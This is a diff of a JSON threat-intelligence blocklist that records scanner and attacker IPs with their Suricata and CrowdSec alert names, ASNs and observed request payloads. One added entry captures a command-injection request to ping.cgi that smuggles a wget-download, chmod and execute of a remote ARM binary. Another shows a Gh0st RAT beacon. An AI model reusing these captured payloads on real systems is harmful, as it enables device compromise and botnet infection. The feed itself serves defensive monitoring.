@@ -1,247 +1,13 @@
 {
-  "generated_at": "2026-05-05T13:00:00Z",
+  "generated_at": "2026-05-06T01:00:00Z",
   "ttl_days": 7,
   "scope": "all",
   "counts": {
-    "total": 95,
-    "v4": 95,
+    "total": 89,
+    "v4": 89,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "172.189.127.11",
-      "family": "v4",
-      "first_seen": "2026-04-28T13:00:00Z",
-      "last_seen": "2026-04-28T13:00:00Z",
-      "scenarios": [
-        "suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "172.160.0.0/11",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /c/msdownload/update/software/defu/2026/04/am_delta_patch_1.449.324.0_3fd98b226d1c0c27af74e1e6aab3677da801f17f.exe?cacheHostOrigin=au.download.windowsupdate.com"
-      ]
-    },
-    {
-      "ip": "34.11.70.76",
-      "family": "v4",
-      "first_seen": "2026-04-28T14:00:00Z",
-      "last_seen": "2026-04-28T14:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN WordPress Scanner Performing Multiple Requests to Windows Live Writer XML"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "34.11.0.0/17",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "GET /wordpress/wp-includes/wlwmanifest.xml"
-      ]
-    },
-    {
-      "ip": "135.222.40.122",
-      "family": "v4",
-      "first_seen": "2026-04-28T15:00:00Z",
-      "last_seen": "2026-04-28T15:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "135.222.0.0/16",
-      "payloads": [
-        "GET /actuator/health"
-      ]
-    },
-    {
-      "ip": "47.91.125.252",
-      "family": "v4",
-      "first_seen": "2026-04-28T23:00:00Z",
-      "last_seen": "2026-04-28T23:00:00Z",
-      "scenarios": [
-        "crowdsec/http-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "45102",
-      "asn_name": "ALIBABA-CN-NET Alibaba US Technology Co.",
-      "asn_prefix": "47.91.112.0/20",
-      "payloads": [
-        "GET /dns-query?dns=-M4BAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE",
-        "POST /dns-query",
-        "GET /dns-query?name=1.odns.m.dnsmeasure.top&type=A",
-        "GET /dns-query?dns=y98BAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE",
-        "GET /query?dns=g7cBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE",
-        "POST /query",
-        "GET /query?name=1.odns.m.dnsmeasure.top&type=A",
-        "GET /query?dns=j5cBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE",
-        "GET /resolve?dns=iYYBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE",
-        "POST /resolve",
-        "GET /resolve?name=1.odns.m.dnsmeasure.top&type=A"
-      ]
-    },
-    {
-      "ip": "199.45.155.108",
-      "family": "v4",
-      "first_seen": "2026-04-28T21:00:00Z",
-      "last_seen": "2026-04-28T21:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "398722",
-      "asn_name": "CENSYS-ARIN-03 - Censys",
-      "asn_prefix": "199.45.155.0/24",
-      "tags": [
-        "mwl:scanner=\"censys\""
-      ],
-      "payloads": [
-        "GET /",
-        "GET /debug/pprof/"
-      ]
-    },
-    {
-      "ip": "20.64.105.121",
-      "family": "v4",
-      "first_seen": "2026-04-28T20:00:00Z",
-      "last_seen": "2026-04-28T20:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing",
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "20.64.0.0/10",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /developmentserver/metadatauploader"
-      ]
-    },
-    {
-      "ip": "199.45.154.128",
-      "family": "v4",
-      "first_seen": "2026-04-28T19:00:00Z",
-      "last_seen": "2026-04-28T19:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "398722",
-      "asn_name": "CENSYS-ARIN-03 - Censys",
-      "asn_prefix": "199.45.154.0/24",
-      "tags": [
-        "mwl:scanner=\"censys\""
-      ],
-      "payloads": [
-        "GET /",
-        "GET /debug/pprof/"
-      ]
-    },
-    {
-      "ip": "199.45.154.155",
-      "family": "v4",
-      "first_seen": "2026-04-28T19:00:00Z",
-      "last_seen": "2026-04-28T19:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "398722",
-      "asn_name": "CENSYS-ARIN-03 - Censys",
-      "asn_prefix": "199.45.154.0/24",
-      "tags": [
-        "mwl:scanner=\"censys\""
-      ],
-      "payloads": [
-        "GET /",
-        "GET /debug/pprof/"
-      ]
-    },
-    {
-      "ip": "20.163.34.54",
-      "family": "v4",
-      "first_seen": "2026-04-28T15:00:00Z",
-      "last_seen": "2026-04-28T15:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "20.160.0.0/12",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /developmentserver/metadatauploader"
-      ]
-    },
-    {
-      "ip": "43.228.157.121",
-      "family": "v4",
-      "first_seen": "2026-04-28T17:00:00Z",
-      "last_seen": "2026-04-28T17:00:00Z",
-      "scenarios": [
-        "suricata/ET TOR Known Tor Exit Node Traffic group 102"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "205759",
-      "asn_name": "GHOSTYNETWORKS Ghosty Networks LLC",
-      "asn_prefix": "43.228.157.0/24"
-    },
-    {
-      "ip": "172.189.127.4",
-      "family": "v4",
-      "first_seen": "2026-04-28T17:00:00Z",
-      "last_seen": "2026-04-28T17:00:00Z",
-      "scenarios": [
-        "suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "172.160.0.0/11",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /d/msdownload/update/software/defu/2026/04/am_delta_patch_1.449.341.0_30508a9c950f0b5e2e20a06fb6025062c0a6a8dd.exe?cacheHostOrigin=au.download.windowsupdate.com"
-      ]
-    },
     {
       "ip": "223.123.72.70",
       "family": "v4",
@@ -1982,6 +1748,88 @@
       ],
       "payloads": [
         "Gh0st\\xad\\xe0x\\x9cKS``\\x98\\xc3\\xc0\\xc0\\xc0\u0006\\xc4\\x8c@\\xbcQ\\x96\\x81\\x81 H\u0007\\xa7\u0016\\x95e&\\xa7*\u0004$&g+\u00182\\x94\\xf6\\xb000\\xac\\xa8rc\u0001\u0011\\xa0\\x82\u001f\\`&\\x83\\xc7K7\\x86\u0019\\xe5n"
+      ]
+    },
+    {
+      "ip": "40.67.161.178",
+      "family": "v4",
+      "first_seen": "2026-05-05T19:00:00Z",
+      "last_seen": "2026-05-05T19:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /developmentserver/metadatauploader"
+      ]
+    },
+    {
+      "ip": "167.94.146.59",
+      "family": "v4",
+      "first_seen": "2026-05-05T17:00:00Z",
+      "last_seen": "2026-05-05T17:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "tags": [
+        "mwl:scanner=\"censys\""
+      ],
+      "payloads": [
+        "GET /",
+        "GET /debug/pprof/"
+      ]
+    },
+    {
+      "ip": "3.131.220.121",
+      "family": "v4",
+      "first_seen": "2026-05-05T18:00:00Z",
+      "last_seen": "2026-05-05T18:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA HTTP unable to match response to request"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "mwl:cloud=\"aws\""
+      ]
+    },
+    {
+      "ip": "70.176.92.83",
+      "family": "v4",
+      "first_seen": "2026-05-05T16:00:00Z",
+      "last_seen": "2026-05-05T16:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "payloads": [
+        "GET /ping.cgi?pingIpAddress=google.fr;wget%20http://37.48.254.120/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7%27/&sessionKey=1039"
+      ]
+    },
+    {
+      "ip": "85.204.70.102",
+      "family": "v4",
+      "first_seen": "2026-05-06T00:00:00Z",
+      "last_seen": "2026-05-06T00:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN WordPress Scanner Performing Multiple Requests to Windows Live Writer XML"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "payloads": [
+        "GET /wp-includes/wlwmanifest.xml"
       ]
     }
   ]
